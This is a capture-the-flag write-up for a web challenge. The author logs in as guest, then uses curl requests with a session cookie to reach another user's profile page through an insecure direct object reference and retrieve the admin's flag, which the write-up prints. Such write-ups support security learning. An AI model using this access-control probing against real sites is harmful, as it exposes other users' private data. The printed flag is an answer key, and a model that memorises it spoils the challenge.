# Doors Everywhere (Part I)

Category: Web

## Description

> A security update about profiles? There's no way there could be a flag there. Unless?

A website was attached.

## Solution

The website homepage linked to a login page:

```html
<div id="content">
    <p>Welcome! Try out our service!</p>
    <p>
        <strong>User:</strong> guest
        <br />
        <strong>Password:</strong> guest
    </p>

    <form action="" method="post">
        <p>
            <label>
                Username:
                <input type="text" name="username">
            </label>
        </p>
        <p>
            <label>
                Password:
                <input type="password" name="password">
            </label>
        </p>
        <input type="submit" value="Login">
    </form>
</div>
```

After logging in with `guest` credentials as suggested above, we are presented with an update
from the admin:

>  We recently fixed a bug where users who weren't logged in would be able to view the profile page of any user on the site. Let us know if the fix causes any problems.
> 
> posted by: admin

In addition, the page's navigation menu contained links to a few special pages:

```html
<ul>
    <li><a href="/profile">Profile</a></li>
    <li><a href="/send">Send secret message</a></li>
</ul>
```

Visiting `/profile` redirects us to `/profile/guest`:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_I]
└─$ curl 'https://secuweb-web.2024-bq.ctfcompetition.com/profile'  -H "Cookie: session=$session"
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/profile/guest">/profile/guest</a>. If not, click the link.
```

Let's follow the redirect:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_I]
└─$ curl 'https://secuweb-web.2024-bq.ctfcompetition.com/profile'  -H "Cookie: session=$session" -L -s | grep flag
            <p>Flag: <input type="text" value="No flag for guest accounts" readonly /></p>
```

What happens if we try to access `/profile/admin` instead, based on the vulnerability the admin was talking about above?

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Doors_Everywhere_Part_I]
└─$ curl 'https://secuweb-web.2024-bq.ctfcompetition.com/profile/admin'  -H "Cookie: session=$session" -s | grep CTF
            <p>Flag: <input type="text" value="CTF{WhatDoesIDORMean?}" readonly /></p>
```

